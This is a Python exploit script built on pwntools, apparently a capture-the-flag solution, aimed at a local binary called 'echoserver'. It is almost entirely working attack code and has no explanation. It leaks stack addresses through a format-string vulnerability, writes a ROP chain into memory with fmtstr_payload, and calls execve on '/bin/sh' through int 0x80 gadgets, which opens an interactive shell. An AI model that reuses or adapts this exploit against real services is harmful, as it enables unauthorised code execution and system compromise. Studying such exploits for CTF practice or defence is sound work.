from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'echoserver'
elf = ELF(program,checksec=False)
lokal = True
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    #libc = elf.libc
else:
    host = ''
    port = ''
    xp = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = "b *0x08049f29 \n b *0x08049fb9 \n c"
    gdb.attach(xp,cmd)

#Exploit Here
sla("es\n","%{}$p".format(264))
ret =int(xp.recvline()[:-1],16)-4
print hex(ret)

sla("es\n","%{}$p".format(148))
leak =int(xp.recvline()[:-1],16)
print hex(leak)
print hex(leak + 0x172)
esp = leak - 0x29a
print "ESP : %s" % hex(esp)


p = p32(leak+0x173)
p += "%5$n"
sl(p)

sl("\x90"*700+"/bin/sh\x00")

binsh = esp + 0x2c0
pop_eax = 0x080acfa6
pop_ebx = 0x0804901e
pop_edx = 0x08064ca8
pop_ecx = 0x08063ca1
int80 = 0x080788df

ret = esp + 0x3dc
lok = esp + 0x3e0

write = {
lok:pop_ecx,
lok+4:0,
lok+8:pop_eax,
lok+12:0x0000000b,
lok+16:pop_ebx,
lok+20:binsh,
lok+24:pop_edx,
lok+28:0,
lok+32: int80
}
# 0xffffcc14

payload = fmtstr_payload(5, {ret : 0x08049fb9})
sl(payload)


payload = fmtstr_payload(5,write)
sl(payload)

whil = leak + 0x172 - 0x8
payload = fmtstr_payload(5, {whil : 0x1})
sl(payload)

xp.interactive()
